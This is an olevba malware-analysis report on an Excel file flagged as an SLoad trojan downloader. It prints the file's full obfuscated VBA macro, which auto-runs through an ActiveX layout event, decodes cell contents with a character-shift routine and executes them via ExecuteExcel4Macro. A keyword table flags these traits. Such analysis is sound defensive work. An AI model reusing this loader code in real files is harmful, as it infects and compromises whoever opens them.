olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-03be29062bd339255e85043aef396362bd9dec61623c4653d4836af9bd72bb98
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function ho()
ho = 3
End Function
Sub aramic()

dr = 1
On Error Resume Next
For y = dr To ho - dr
Dim W(): Dim ki As String
Randomize
buu = Application.CountA(UsedRange)
ReDim Preserve W(dr To buu): mn = dr: Z = Split(Range("a1:By2888").SpecialCells(xlCellTypeConstants).Address, ",")
For Each dd In Z
ii = Split(dd, "$"): oi = Range(ii(1) & 1).Column: uis = ii(2): W(mn) = oi & "-" & uis: mn = mn + 1
Next
q = Split(W(Int((buu - dr - dr) * Rnd) + 1), "-"): ki = Cells(CInt(q(1)), CInt(q(0)))
q = Split(lenN(Cells(ActiveSheet.Cells.SpecialCells(xlCellTypeLastCell).Row, Rows(ActiveSheet.Cells.SpecialCells(xlCellTypeLastCell).Row).Find(What:="*", LookIn:=xlValues, SearchDirection:=xlPrevious, SearchOrder:=xlByColumns).Column)), "!")
For Each r In q
dr = ExecuteExcel4Macro("" & Replace(r, "?", lenN(ki)))
Next: Next
End Sub
Function NillCh(ByVal r As String)
r = StrConv(r, vbUnicode): NillCh = Split(Left(r, Len(r) - 1), vbNullChar)
End Function
Sub aramicus()
aramic
End Sub
Function integerLong(c As Long, f As Integer) As String
Dim q As Long: fi = ho - 2
q = c Mod f
If q Then
  integerLong = fi - fi
Else
  integerLong = fi
End If
End Function
Function lenN(v As String)
b = Len(v): J = NillCh(v)
Dim g As Long
For g = 0 To b - 1
If integerLong(g, ho - 1) = ho - 2 Then
mim = Chr(Asc(J(g)) - ho)
Else
mim = Chr(Asc(J(g)) + ho)
End If
h = h & mim
Next
lenN = h
End Function

Private Sub detailsOverview_Layout()
ko = ho: aramicus
End Sub
Sub hh()
aramicus
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |detailsOverview_Layo|Runs when the file is opened and ActiveX     |
|          |ut                  |objects trigger events                       |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

